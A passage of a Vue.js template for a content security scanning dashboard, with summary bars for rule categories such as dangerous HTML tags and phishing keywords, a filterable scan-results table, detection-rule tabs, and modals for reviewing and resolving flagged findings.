                <span class="text-foreground">Dangerous HTML Tags (script/iframe)</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-orange-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Event Handlers & JS Attributes</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-amber-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Spam & Phishing Keywords</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-blue-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>
          </div>

          <div class="pt-3 border-t border-border flex items-center justify-between">
            <span class="text-xs text-muted-foreground font-medium">Active Rule Sets</span>
            <button 
              @click="mainTab = 'rules'" 
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              Configure Rules <ArrowRight class="w-3 h-3" />
            </button>
          </div>
        </div>

        <!-- Recent Findings Compact Section -->
        <div class="lg:col-span-8 bg-card border border-border rounded-2xl p-5 shadow-xs space-y-4">
          <div class="flex items-center justify-between">
            <div>
              <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
                <AlertTriangle class="w-4 h-4 text-amber-500" />
                Recent Flagged Findings
              </h3>
              <p class="text-xs text-muted-foreground mt-0.5">Latest high-priority security exceptions</p>
            </div>
            <button 
              @click="mainTab = 'results'"
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              View All ({{ contentScansCount }}) <ArrowRight class="w-3 h-3" />
            </button>
          </div>

          <!-- Compact List of Findings -->
          <div class="divide-y divide-border border border-border rounded-xl overflow-hidden">
            <div 
              v-for="item in recentFindings" 
              :key="item.id"
              @click="openFindingDetail(item)"
              class="p-3.5 hover:bg-muted/30 transition-colors flex flex-col sm:flex-row sm:items-center justify-between gap-3 cursor-pointer group"
            >
              <div class="flex items-start gap-3 min-w-0">
                <div 
                  :class="cn(
                    'w-8 h-8 rounded-lg flex items-center justify-center shrink-0 mt-0.5',
                    item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600' :
                    item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600' :
                    item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600' : 'bg-emerald-500/10 text-emerald-600'
                  )"
                >
                  <component :is="getStatusBadge(item.status).icon" class="w-4 h-4" />
                </div>
                <div class="min-w-0 space-y-0.5">
                  <div class="flex items-center gap-2 flex-wrap">
                    <span class="text-xs font-bold text-foreground group-hover:text-primary transition-colors truncate max-w-[280px] sm:max-w-[340px]">
                      {{ item.contentName }}
                    </span>
                    <span class="text-[10px] font-mono text-muted-foreground bg-muted px-1.5 py-0.5 rounded">
                      {{ item.field }}
                    </span>
                  </div>
                  <p class="text-xs text-muted-foreground line-clamp-1">
                    {{ item.description }}
                  </p>
                </div>
              </div>

              <div class="flex items-center justify-between sm:justify-end gap-3 shrink-0 pt-2 sm:pt-0 border-t sm:border-t-0 border-border/50">
                <div class="text-right">
                  <span 
                    :class="cn(
                      'px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border',
                      item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 border-rose-500/20' :
                      item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 border-orange-500/20' :
                      item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 border-amber-500/20' : 'bg-emerald-500/10 text-emerald-600 border-emerald-500/20'
                    )"
                  >
                    {{ item.status }}
                  </span>
                  <p class="text-[10px] text-muted-foreground mt-0.5">{{ item.scannedAt }}</p>
                </div>
                <button 
                  class="p-1.5 rounded-lg text-muted-foreground group-hover:text-primary hover:bg-muted transition-colors"
                  title="View finding details"
                >
                  <ChevronRight class="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 2: SCAN RESULTS TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'results'" class="space-y-4 animate-in fade-in duration-300">
      <!-- Search & Filters Toolbar -->
      <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
        <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
          <!-- Search Box -->
          <div class="relative flex-1">
            <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
            <input 
              v-model="searchQuery"
              type="text" 
              placeholder="Search content name, ID, or field name..." 
              class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
            />
            <button 
              v-if="searchQuery" 
              @click="searchQuery = ''"
              class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
            >
              <X class="w-3.5 h-3.5" />
            </button>
          </div>

          <!-- Filter Dropdowns Row -->
          <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
            <!-- Content Type -->
            <select 
              v-model="filterContentType"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Types</option>
              <option value="Product">Products</option>
              <option value="Category">Categories</option>
            </select>

            <!-- Status Filter -->
            <select 
              v-model="filterStatus"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Statuses</option>
              <option value="Critical">Critical</option>
              <option value="High Risk">High Risk</option>
              <option value="Needs Review">Needs Review</option>
              <option value="Clean">Clean</option>
              <option value="Resolved">Resolved</option>
            </select>

            <!-- Page Size Selector -->
            <div class="flex items-center gap-1.5 border-l border-border pl-2 shrink-0">
              <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
              <select 
                v-model="itemsPerPage"
                class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option :value="5">5 / page</option>
                <option :value="10">10 / page</option>
                <option :value="25">25 / page</option>
                <option :value="50">50 / page</option>
              </select>
            </div>

            <!-- Reset Button -->
            <button 
              v-if="searchQuery || filterContentType !== 'all' || filterStatus !== 'all'"
              @click="resetFilters"
              class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
              title="Reset all filters"
            >
              Reset
            </button>
          </div>
        </div>
      </div>

      <!-- Main Scan Table -->
      <div class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <UiTable 
          :columns="scanResultColumns" 
          :data="contentScansData"
          empty-text="No content scans found"
          empty-description="No items match your active filters or search criteria."
          :loading="isContentScansLoading"
        >
          <!-- Status Cell -->
          <template #cell-status="{ item }">
            <span 
              :class="cn(
                'inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border whitespace-nowrap',
                item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30' :
                item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 dark:text-orange-400 border-orange-500/30' :
                item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30' :
                item.status === 'Clean' ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30' :
                'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30'
              )"
            >
              {{ item.status }}
            </span>
          </template>

          <!-- Risk Score Cell -->
          <template #cell-risk_score="{ item }">
            <div class="flex items-center gap-2">
              <div class="w-12 h-2 bg-muted rounded-full overflow-hidden">
                <div 
                  :class="cn(
                    'h-full rounded-full',
                    item.risk_score >= 80 ? 'bg-rose-500' :
                    item.risk_score >= 50 ? 'bg-amber-500' : 'bg-emerald-500'
                  )"
                  :style="{ width: `${item.risk_score}%` }"
                ></div>
              </div>
              <span class="text-xs font-mono font-bold text-foreground">
                {{ item.risk_score }}
              </span>
            </div>
          </template>

          <!-- Scanned At Cell -->
          <template #cell-scanned_at="{ item }">
            <span class="text-xs text-muted-foreground font-mono">
              {{ new Date(item.scanned_at).toLocaleString() }}
            </span>
          </template>

          <!-- Actions Cell -->
          <template #cell-actions="{ item }">
            <div class="flex items-center justify-end gap-1.5">
              <button 
                @click.stop="openScanDetail(item)"
                class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                title="View scan details"
                aria-label="View scan details"
              >
                <Eye class="w-4 h-4" />
              </button>
            </div>
          </template>
        </UiTable>

        <!-- Pagination Controls -->
        <div class="px-4 py-3 border-t border-border bg-muted/20 flex items-center justify-between">
          <UiPagination 
            :current-page="currentPage"
            :total-pages="contentScansPages"
            :total-count="contentScansCount"
            :items-per-page="itemsPerPage"
            item-label="scans"
            @update:current-page="currentPage = $event"
          />
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION: FINDINGS TAB -->
    <!-- ========================================== -->
    <FindingsTab v-if="mainTab === 'findings'" ref="findingsTab" />

    <!-- ========================================== -->
    <!-- SECTION 3: DETECTION RULES TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'rules'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Sub-Tabs for Detection Rules -->
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-3">
        <div class="flex items-center gap-2 overflow-x-auto custom-scrollbar pb-1 sm:pb-0">
          <button 
            v-for="sub in visibleSubTabs"
            :key="sub.id"
            @click="rulesSubTab = sub.id as any"
            :class="cn(
              'px-3.5 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5',
              rulesSubTab === sub.id 
                ? 'bg-primary text-primary-foreground shadow-sm' 
                : 'text-muted-foreground hover:text-foreground hover:bg-muted'
            )"
          >
            <span>{{ sub.label }}</span>
            <span 
              :class="cn(
                'px-1.5 py-0.2 rounded-full text-[10px] font-bold',
                rulesSubTab === sub.id ? 'bg-primary-foreground/20 text-primary-foreground' : 'bg-muted text-muted-foreground'
              )"
            >
              {{ sub.count }}
            </span>
          </button>
        </div>

        <UiButton 
          v-if="(rulesSubTab === 'keywords' && canAddKeywordRule) || (rulesSubTab === 'domains' && canAddDomainRule) || (rulesSubTab === 'hidden_content' && canAddHiddenContentRule) || (rulesSubTab === 'obfuscation' && canAddObfuscationRule) || (rulesSubTab === 'redirects' && canAddRedirectRule) || (rulesSubTab === 'attributes' && canAddHtmlAttributeRule) || (rulesSubTab === 'html' && canAddHtmlTagRule)"
          @click="openAddRuleModal(
            rulesSubTab === 'keywords' ? 'keyword' :
            rulesSubTab === 'domains' ? 'domain' :
            rulesSubTab === 'hidden_content' ? 'hidden_content' :
            rulesSubTab === 'obfuscation' ? 'obfuscation' :
            rulesSubTab === 'html' ? 'html' :
            rulesSubTab === 'attributes' ? 'attribute' : 'redirect'
          )"
          size="sm"
          class="h-9 px-4 gap-1.5 font-bold text-xs shrink-0"
        >
          <Plus class="w-3.5 h-3.5" />
          <span>Add {{ 
            rulesSubTab === 'keywords' ? 'Keyword' :
            rulesSubTab === 'domains' ? 'Domain' :
            rulesSubTab === 'hidden_content' ? 'Hidden Content Rule' :
            rulesSubTab === 'obfuscation' ? 'Obfuscation Rule' :
            rulesSubTab === 'html' ? 'HTML Tag' :
            rulesSubTab === 'attributes' ? 'Attribute' : 'Redirect Rule'
          }}</span>
        </UiButton>
      </div>

      <!-- Sub-Tabs Panels -->
      <KeywordRulesTab 
        v-if="rulesSubTab === 'keywords'" 
        @refresh-summary="fetchDetectionRulesSummary" 
        @open-create="openAddRuleModal('keyword')" 
      />
      <DomainRulesTab 
        v-else-if="rulesSubTab === 'domains'" 
        @refresh-summary="fetchDetectionRulesSummary" 
        @open-create="openAddRuleModal('domain')" 
      />
      <HiddenContentRulesTab 
        v-else-if="rulesSubTab === 'hidden_content'" 
        @refresh-summary="fetchDetectionRulesSummary" 
        @open-create="openAddRuleModal('hidden_content')" 
      />
      <ObfuscationRulesTab 
        v-else-if="rulesSubTab === 'obfuscation'" 
        @refresh-summary="fetchDetectionRulesSummary" 
        @open-create="openAddRuleModal('obfuscation')" 
      />
      <RedirectRulesTab 
        v-else-if="rulesSubTab === 'redirects'" 
        @refresh-summary="fetchDetectionRulesSummary" 
        @open-create="openAddRuleModal('redirect')" 
      />
      <HtmlAttributeRulesTab 
        v-else-if="rulesSubTab === 'attributes'" 
        @refresh-summary="fetchDetectionRulesSummary" 
        @open-create="openAddRuleModal('attribute')" 
      />
      <HtmlTagRulesTab 
        v-else-if="rulesSubTab === 'html'" 
        @refresh-summary="fetchDetectionRulesSummary" 
        @open-create="openAddRuleModal('html')" 
      />

      <!-- Rule Creation Modal (unified) -->
      <DetectionRuleCreateModal
        :is-open="isCreateModalOpen"
        :initial-type="createModalInitialType"
        @close="isCreateModalOpen = false"
        @created="handleRuleCreated"
      />
    </div>

    <!-- ========================================== -->
    <!-- MODAL: FINDING DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="findingModalState.isView.value"
      :title="isFindingDetailsLoading ? 'Loading Finding...' : (selectedFindingDetail ? `Finding #${selectedFindingDetail.id}` : 'Finding Details')"
      :subtitle="selectedFindingDetail ? `${selectedFindingDetail.content_type} Content Security Inspection Details` : 'Detailed security inspection parameters and review lifecycle metadata.'"
      max-width="max-w-3xl"
      @close="closeFindingDetail"
    >
      <!-- Loading State -->
      <div v-if="isFindingDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving finding details from security engine...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedFindingDetail" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Finding Not Found</p>
        <p class="text-xs text-muted-foreground">Could not load the requested finding details from the security engine.</p>
        <button 
          type="button"
          @click="closeFindingDetail"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details State -->
      <div v-else class="p-6 space-y-6 overflow-y-auto max-h-[75vh]">
        <!-- Overview Banner -->
        <div class="bg-muted/40 border border-border rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div class="space-y-1.5 min-w-0">
            <div class="flex flex-wrap items-center gap-2">
              <span :class="cn('px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedFindingDetail.severity))">
                {{ selectedFindingDetail.severity }} Severity
              </span>
              <span :class="cn('px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getFindingReviewStatusBadge(selectedFindingDetail.review_status).class)">
                {{ getFindingReviewStatusBadge(selectedFindingDetail.review_status).label }}
              </span>
              <span class="px-2 py-0.5 rounded-full text-[10px] font-mono font-semibold bg-muted text-foreground border border-border">
                {{ selectedFindingDetail.detector }}
              </span>
            </div>
            <h3 class="text-base font-bold text-foreground flex items-center gap-2">
              <span>Finding #{{ selectedFindingDetail.id }}</span>
              <span class="text-xs font-normal text-muted-foreground font-mono">(Scan #{{ selectedFindingDetail.scan }})</span>
            </h3>
            <p class="text-xs text-muted-foreground font-mono">
              Target: <strong class="text-foreground">{{ selectedFindingDetail.content_type }}</strong> #{{ selectedFindingDetail.object_id }} &bull; Field: <strong class="text-foreground">{{ selectedFindingDetail.field_name }}</strong>
            </p>
          </div>
        </div>

        <!-- Finding Information Section -->
        <div class="space-y-2">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Finding Information</span>
          <div class="bg-card border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Finding ID:</span>
              <p class="font-mono text-foreground font-bold pl-1">#{{ selectedFindingDetail.id }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Related Scan ID:</span>
              <p class="font-mono text-foreground font-bold pl-1">Scan #{{ selectedFindingDetail.scan }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Content Type:</span>
              <p class="text-foreground font-medium pl-1">{{ selectedFindingDetail.content_type }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Object ID:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.object_id }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Field Name:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.field_name }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Detector:</span>
              <p class="text-foreground font-medium pl-1">{{ selectedFindingDetail.detector }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Rule ID Value:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.rule_id_value || '—' }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Rule Value:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.rule_value || '—' }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Category:</span>
              <p class="text-foreground font-medium pl-1">{{ selectedFindingDetail.category || '—' }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Severity:</span>
              <div class="pl-1">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedFindingDetail.severity))">
                  {{ selectedFindingDetail.severity }}
                </span>
              </div>
            </div>

            <div class="space-y-1 sm:col-span-2">
              <span class="font-semibold text-muted-foreground">Matched Value:</span>
              <div class="bg-muted/50 p-2.5 rounded-lg border border-border">
                <code class="font-mono text-rose-600 dark:text-rose-400 text-xs font-semibold break-all">
                  {{ selectedFindingDetail.matched_value || '—' }}
                </code>
              </div>
            </div>

            <div class="space-y-1 sm:col-span-2">
              <span class="font-semibold text-muted-foreground">Detection Message:</span>
              <p class="text-foreground font-medium pl-1 leading-relaxed">{{ selectedFindingDetail.message || '—' }}</p>
            </div>
          </div>
        </div>

        <!-- Detection Metadata Section -->
        <div class="space-y-2">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Metadata</span>
          <div class="bg-card border border-border rounded-xl p-4">
            <div v-if="selectedFindingDetail.metadata && typeof selectedFindingDetail.metadata === 'object' && Object.keys(selectedFindingDetail.metadata).length > 0">
              <pre class="text-xs font-mono bg-muted/60 p-3 rounded-lg overflow-x-auto text-foreground leading-relaxed">{{ JSON.stringify(selectedFindingDetail.metadata, null, 2) }}</pre>
            </div>
            <p v-else class="text-xs text-muted-foreground italic">—</p>
          </div>
        </div>

        <!-- Review Information Section -->
        <div class="space-y-2">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Review Information</span>
          <div class="bg-card border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Review Status:</span>
              <div class="pl-1">
                <span :class="cn('px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getFindingReviewStatusBadge(selectedFindingDetail.review_status).class)">
                  {{ getFindingReviewStatusBadge(selectedFindingDetail.review_status).label }}
                </span>
              </div>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Reviewed By:</span>
              <p class="text-foreground font-medium pl-1">{{ selectedFindingDetail.reviewed_by || '—' }}</p>
            </div>

            <div class="space-y-1">
              <span class="font-semibold text-muted-foreground">Reviewed At:</span>
              <p class="font-mono text-foreground font-medium pl-1">{{ selectedFindingDetail.reviewed_at ? formatDate(selectedFindingDetail.reviewed_at) : '—' }}</p>
            </div>

            <div class="space-y-1 sm:col-span-2">
              <span class="font-semibold text-muted-foreground">Review Note:</span>
              <p class="text-foreground font-medium pl-1 leading-relaxed">{{ selectedFindingDetail.review_note || '—' }}</p>
            </div>
          </div>
        </div>

        <!-- Audit & Lifecycle Timestamps -->
        <div class="space-y-2">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Timestamps</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedFindingDetail.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedFindingDetail.updated_at) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-between">
          <div class="flex items-center gap-2">
            <button 
              v-if="canReviewFinding"
              type="button"
              @click="openFindingReview(selectedFindingDetail)"
              class="h-9 px-4 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer flex items-center gap-1.5 shadow-sm"
            >
              <ShieldCheck class="w-3.5 h-3.5" />
              <span>Review Finding</span>
            </button>
            <button 
              v-if="canResolveFinding"
              type="button"
              @click="openFindingResolve(selectedFindingDetail)"
              class="h-9 px-4 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold transition-colors cursor-pointer flex items-center gap-1.5 shadow-sm"
            >
              <CheckCircle class="w-3.5 h-3.5" />
              <span>Resolve Finding</span>
            </button>
          </div>
          <button 
            type="button"
            @click="closeFindingDetail"
            class="h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: REVIEW CONTENT SCAN FINDING -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isReviewModalOpen"
      :title="`Review Finding: #${reviewTargetFinding?.id || ''}`"
      subtitle="Submit a security review decision and audit note for this detection finding."
      max-width="max-w-xl"
      @close="closeFindingReview"
    >
      <form v-if="reviewTargetFinding" @submit.prevent="submitFindingReview" class="p-6 space-y-5">
        <!-- Target Finding Summary Card -->
        <div class="bg-muted/40 border border-border rounded-xl p-3.5 space-y-2 text-xs">
          <div class="flex items-center justify-between text-muted-foreground">
            <span class="font-semibold">Target Entity:</span>
            <span class="font-mono text-foreground font-bold">{{ reviewTargetFinding.content_type || '—' }} (ID: {{ reviewTargetFinding.id }})</span>
          </div>
          <div class="flex items-center justify-between text-muted-foreground">
            <span class="font-semibold">Detector / Category:</span>
            <span class="text-foreground font-medium">{{ reviewTargetFinding.detector || 'DETECTOR' }} &bull; {{ reviewTargetFinding.category || 'Security Finding' }}</span>
          </div>
          <div v-if="reviewTargetFinding.matched_value" class="space-y-1 pt-1 border-t border-border/50">
            <span class="font-semibold text-muted-foreground">Matched Snippet:</span>
            <p class="font-mono text-[11px] bg-background/80 border border-border/60 rounded px-2 py-1 text-foreground break-all">
              {{ reviewTargetFinding.matched_value }}
            </p>
          </div>
        </div>

        <!-- Review Status Selection -->
        <div class="space-y-2">
          <label class="text-xs font-bold text-foreground flex items-center justify-between">
            <span>Review Decision <span class="text-rose-500">*</span></span>
          </label>
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <!-- FALSE_POSITIVE Option -->
            <label
              :class="cn(
                'flex flex-col gap-1 p-3 rounded-xl border cursor-pointer transition-all',
                reviewForm.review_status === 'FALSE_POSITIVE'
                  ? 'bg-emerald-500/10 border-emerald-500/40 text-emerald-950 dark:text-emerald-200 ring-1 ring-emerald-500/40'
                  : 'bg-card border-border hover:bg-muted/40 text-foreground'
              )"
            >
              <div class="flex items-center gap-2">
                <input
                  type="radio"
                  name="review_status"
                  value="FALSE_POSITIVE"
                  v-model="reviewForm.review_status"
                  class="text-emerald-600 focus:ring-emerald-500"
                />
                <div class="flex items-center gap-1.5">
                  <CheckCircle2 class="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                  <span class="text-xs font-bold">False Positive</span>
                </div>
              </div>
              <p class="text-[11px] text-muted-foreground pl-5 leading-tight">
                Mark detection as harmless or intended content.
              </p>
            </label>

            <!-- CONFIRMED Option -->
            <label
              :class="cn(
                'flex flex-col gap-1 p-3 rounded-xl border cursor-pointer transition-all',
                reviewForm.review_status === 'CONFIRMED'
                  ? 'bg-rose-500/10 border-rose-500/40 text-rose-950 dark:text-rose-200 ring-1 ring-rose-500/40'
                  : 'bg-card border-border hover:bg-muted/40 text-foreground'
              )"
            >
              <div class="flex items-center gap-2">
                <input
                  type="radio"
                  name="review_status"
                  value="CONFIRMED"
                  v-model="reviewForm.review_status"
                  class="text-rose-600 focus:ring-rose-500"
                />
                <div class="flex items-center gap-1.5">
                  <AlertOctagon class="w-4 h-4 text-rose-600 dark:text-rose-400" />
                  <span class="text-xs font-bold">Confirmed Threat</span>
                </div>
              </div>
              <p class="text-[11px] text-muted-foreground pl-5 leading-tight">
                Mark detection as genuinely suspicious or harmful.
              </p>
            </label>
          </div>
        </div>

        <!-- Review Note -->
        <div class="space-y-1.5">
          <div class="flex items-center justify-between">
            <label class="text-xs font-bold text-foreground">
              Audit Note <span class="text-[10px] font-normal text-muted-foreground">(Optional)</span>
            </label>
            <span :class="cn('text-[10px] font-mono', (reviewForm.review_note?.length || 0) > 2000 ? 'text-rose-500 font-bold' : 'text-muted-foreground')">
              {{ reviewForm.review_note?.length || 0 }} / 2000
            </span>
          </div>
          <textarea
            v-model="reviewForm.review_note"
            rows="3"
            maxlength="2000"
            placeholder="Document rationale, investigation findings, or triage action notes (max 2000 characters)..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground placeholder:text-muted-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all resize-none"
          ></textarea>
        </div>

        <!-- Form Error Banner -->
        <div v-if="reviewFormError" class="p-3 bg-rose-500/10 border border-rose-500/20 rounded-xl text-xs text-rose-600 dark:text-rose-400 flex items-center gap-2">
          <AlertCircle class="w-4 h-4 shrink-0" />
          <span>{{ reviewFormError }}</span>
        </div>

        <!-- Modal Footer Actions -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2.5">
          <button
            type="button"
            @click="closeFindingReview"
            :disabled="isReviewSubmitting"
            class="h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer disabled:opacity-50"
          >
            Cancel
          </button>
          <button
            type="submit"
            :disabled="isReviewSubmitting || !reviewForm.review_status || (reviewForm.review_note?.length || 0) > 2000"
            class="h-9 px-4 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer flex items-center gap-1.5 shadow-sm disabled:opacity-50"
          >
            <Loader2 v-if="isReviewSubmitting" class="w-3.5 h-3.5 animate-spin" />
            <ShieldCheck v-else class="w-3.5 h-3.5" />
            <span>{{ isReviewSubmitting ? 'Submitting...' : 'Submit Review' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: RESOLVE CONTENT SCAN FINDING -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isResolveModalOpen"
      :title="`Resolve Finding: #${resolveTargetFinding?.id || ''}`"
      subtitle="Mark this security finding as addressed and resolved in the system."
      max-width="max-w-xl"
      @close="closeFindingResolve"
    >
      <form v-if="resolveTargetFinding" @submit.prevent="submitFindingResolve" class="p-6 space-y-5">
        <!-- Target Finding Summary Card -->
        <div class="bg-muted/40 border border-border rounded-xl p-3.5 space-y-2 text-xs">
          <div class="flex items-center justify-between text-muted-foreground">
            <span class="font-semibold">Target Entity:</span>
            <span class="font-mono text-foreground font-bold">{{ resolveTargetFinding.content_type || '—' }} (ID: {{ resolveTargetFinding.id }})</span>
          </div>
          <div class="flex items-center justify-between text-muted-foreground">
            <span class="font-semibold">Detector / Category:</span>
            <span class="text-foreground font-medium">{{ resolveTargetFinding.detector || 'DETECTOR' }} &bull; {{ resolveTargetFinding.category || 'Security Finding' }}</span>
          </div>
          <div v-if="resolveTargetFinding.matched_value" class="space-y-1 pt-1 border-t border-border/50">
            <span class="font-semibold text-muted-foreground">Matched Snippet:</span>
            <p class="font-mono text-[11px] bg-background/80 border border-border/60 rounded px-2 py-1 text-foreground break-all">
              {{ resolveTargetFinding.matched_value }}
            </p>
          </div>
        </div>

        <!-- Resolution Confirmation Info -->
        <div class="p-3.5 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-xs text-emerald-950 dark:text-emerald-200 flex items-start gap-2.5">
          <CheckCircle class="w-4 h-4 text-emerald-600 dark:text-emerald-400 shrink-0 mt-0.5" />
          <div class="space-y-0.5">
            <p class="font-bold">Mark Finding as Resolved</p>
            <p class="text-[11px] text-muted-foreground leading-relaxed">
